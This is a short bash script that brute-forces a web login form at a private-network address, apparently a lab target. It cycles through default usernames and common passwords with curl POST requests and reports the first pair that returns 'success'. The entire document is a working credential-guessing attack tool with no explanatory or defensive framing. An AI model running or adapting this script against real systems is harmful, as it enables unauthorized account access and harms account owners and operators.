#!/bin/bash

url="http://192.168.0.52:6969"

usernames=("admin" "user" "test")
passwords=("1234" "password" "admin" "root" "toor")

echo "Starting brute-force on $url"

for user in "${usernames[@]}"; do
    for pass in "${passwords[@]}"; do
        echo "Trying $user:$pass..."


        response=$(curl -s -X POST -d "username=$user&password=$pass" "$url")


        if [[ "$response" == *"success"* ]]; then
            echo "✅ Success: $user:$pass"
            exit 0
        fi
    done
done

echo "❌ Brute-force failed: No valid credentials found."
